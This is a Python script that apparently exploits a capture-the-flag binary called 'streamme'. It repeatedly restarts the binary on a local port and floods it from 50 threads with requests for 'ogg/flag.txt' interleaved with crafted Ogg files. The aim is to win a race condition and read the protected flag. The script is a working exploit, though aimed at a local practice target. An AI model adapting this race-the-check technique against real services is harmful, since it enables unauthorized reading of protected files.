import socket
import sys
import os
import re
import time
import threading
import signal

def createFile(number):
	filename = 'ogg/'+ str(number) +'.ogg'
	with(open(filename, 'w+')) as f:
		f.write('Ogg')
		f.seek(number - 1)
		f.write("\0")
	return filename

def connectToServer():
	print('connecting to server')
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('127.0.0.1', 1337))
	return sock


def checkForFlag(data):
	reg = re.compile("IIS{.*}")
#	reg = re.compile("fool")
	result = reg.search(str(data, 'utf-8'))
	if result:
		print(result.group(0))
		return True
	return False

def receive():
	try:
		while serverRunning:
			data = sock.recv(100000000)
#			print(str(data, 'utf-8'))
			if(checkForFlag(data)):
				flagFoundCondition.acquire()
				flagFoundCondition.notify()
				flagFoundCondition.release()
				return checkForFlag(data)
			
			global tryCounter
			tryCounter += 1
			if tryCounter % 10 == 0:
				print('did ' + str(tryCounter) + ' tries') #intentienally not mutex'd
	except Exception as e:
		print(e)
	decreaseThreadCount()

def startThread(target):
	global threadCounter
	counterMutex.acquire()
	threadCounter = threadCounter + 1
	counterMutex.release()

	thread = threading.Thread(target=target, args=( ))
	thread.setDaemon(True)
	thread.start()
	return thread

def decreaseThreadCount():
	global serverRunning
	serverRunning = False
	counterMutex.acquire()
	global threadCounter
	threadCounter = threadCounter - 1
	if threadCounter <= 2: #thread starting threads still running
		threadsDeadCondition.acquire()
		threadsDeadCondition.notify()
		threadsDeadCondition.release()
	counterMutex.release()

def send():
	try:
		while serverRunning:
			sock.sendall(str.encode('ogg/flag.txt' + '\0'))
			time.sleep(sendSleepTime)
			sock.sendall(str.encode(smallFile + '\0'))
			time.sleep(sendSleepTime)
			sock.sendall(str.encode(bigFile + '\0'))
			time.sleep(sendSleepTime)

	except Exception as e:
		print(e)
	decreaseThreadCount()
		
def startServer():
	global serverPid
	if serverPid != 0:
		try:
			os.kill(serverPid, signal.SIGTERM)
		except OSError:
			pass

	serverPid = os.fork()
	if serverPid == 0:
		print('start server')
		os.execv('./streamme', ['streamme'])
	else:
		os.waitpid(serverPid, 0)
		global serverRunning
		print('server dead')
		serverRunning = False

	decreaseThreadCount()
def busyWait():
	while serverRunning:
		i = threadCounter / int(round(time.time()))
	decreaseThreadCount()

def startThreads():
	while True:
		startThread(startServer)
		time.sleep(1)
		global sock
		sock = connectToServer()
		global serverRunning
		serverRunning = True
		print('connected')

		for i in range(receiveThreads):
			startThread(receive)
		print('started receiving threads')
	
		for i in range (sendThreads):
			thread = startThread(send)
		print('started sending threads')

		for i in range (busyThreads):
			startThread(busyWait)			
		print('started busy threads')
		print('all started')


		threadsDeadCondition.acquire()
		threadsDeadCondition.wait()
		threadsDeadCondition.release()

		print('threads dead, restarting')
		print()
			
	
smallFile = createFile(14)
bigFile = createFile(1024 * 1024 * 10)

serverRunning = False
sendThreads = 50
receiveThreads = 1
busyThreads = 0
sendSleepTime = 0.5
threadCounter = 0
serverPid = 0
sock = 0

counterMutex = threading.Lock()
threadsDeadCondition = threading.Condition()
startThread(startThreads)

flagFoundCondition = threading.Condition()

tryCounter = 0

flagFoundCondition.acquire()
flagFoundCondition.wait()
flagFoundCondition.release()
print('got the flag')